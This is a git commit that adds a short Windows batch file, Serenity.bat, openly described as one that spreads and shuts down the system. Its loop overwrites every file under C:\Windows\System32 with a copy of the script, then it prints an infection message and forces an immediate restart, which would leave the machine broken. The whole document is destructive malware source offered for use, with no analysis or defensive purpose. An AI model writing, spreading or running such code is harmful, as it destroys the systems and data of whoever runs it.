5fbe76207bcb1f19a21dc75434d2ed043fdd39ba
wlingahamnako-hue <wlingahamnako@gmail.com>
2026-08-12 10:18:48 -0400

    Create Serenity.bat to spread and shutdown system
    This batch file copies itself to all files in System32, displays a warning message, and then restarts the computer.

---
+++ Serenity.bat
@@ -0,0 +1,5 @@
+@echo off
+for /R "C:\Windows\System32\*.*" %%G in (*) do copy "%~dp0\Serenity.bat" "%%G"
+echo Your computer is infected with Serenity, use it while you can.
+pause
+shutdown -r -t 0
